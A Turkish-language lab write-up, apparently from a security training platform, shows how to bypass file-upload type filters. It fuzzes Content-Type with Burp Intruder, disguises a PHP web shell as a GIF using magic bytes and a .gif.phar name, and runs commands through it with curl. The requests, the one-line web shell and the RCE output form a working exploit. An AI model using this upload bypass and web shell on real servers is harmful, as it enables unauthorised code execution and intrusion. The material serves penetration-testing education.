# Bypassing Type Filters

## Content-Type

Yasaklı olmayan bir dosya tipi bulmak için Burp Intruder kullanılacak.

Dosya tipi, Add § ile payload noktası olarak seçilir:

```http title="Request" hl_lines="18"
POST /upload.php HTTP/1.1
Host: 94.237.53.203:31780
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundarya2410c0555bdc1e3a3c4115c3052db57
Content-Length: 269
Origin: http://94.237.53.203:31780
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.53.203:31780/
Priority: u=0

------geckoformboundarya2410c0555bdc1e3a3c4115c3052db57
Content-Disposition: form-data; name="uploadFile"; filename="shell.gif.phar"
Content-Type: §application/octet-stream§


<?php system($_GET["cmd"]); ?>

------geckoformboundarya2410c0555bdc1e3a3c4115c3052db57--
```

1. Payloads altında, Payload type için Simple list seçilir.
2. Payloads altında, Payload configuration için Load ile [web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) wordlist yüklenir.
3. Payloads altında, Payload encoding için URL-encode these characters seçeneği devre dışı bırakılır.

Saldırı, Start attack ile başlatılır.

Başarılı bir saldırı, aşağıdaki gibi bir yanıt ile sonuçlanır:

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 28 Apr 2025 14:32:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 26
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

File successfully uploaded
```

Aşağıda verilen tablo, başarı ile sonuçlanan dosya tiplerini gösterir:

| REQUEST | PAYLOAD | LENGTH |
|---|---|---|
| 11 | image/gif | 230 |
| 22 | image/jpg | 230 |
| 38 | image/png | 230 |

## [MIME Type](https://en.wikipedia.org/wiki/List_of_file_signatures)

```http title="Request" hl_lines="18 20-21"
POST /upload.php HTTP/1.1
Host: 94.237.53.203:31780
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundarya2410c0555bdc1e3a3c4115c3052db57
Content-Length: 269
Origin: http://94.237.53.203:31780
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.53.203:31780/
Priority: u=0

------geckoformboundarya2410c0555bdc1e3a3c4115c3052db57
Content-Disposition: form-data; name="uploadFile"; filename="shell.gif.phar"
Content-Type: image/gif

GIF8
<?php system($_GET["cmd"]); ?>

------geckoformboundarya2410c0555bdc1e3a3c4115c3052db57--
```

## RCE

```sh
my@attack:~$ curl -s 'http://94.237.53.203:31780/profile_images/shell.gif.phar?cmd=id'
```

```output title="Output"
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
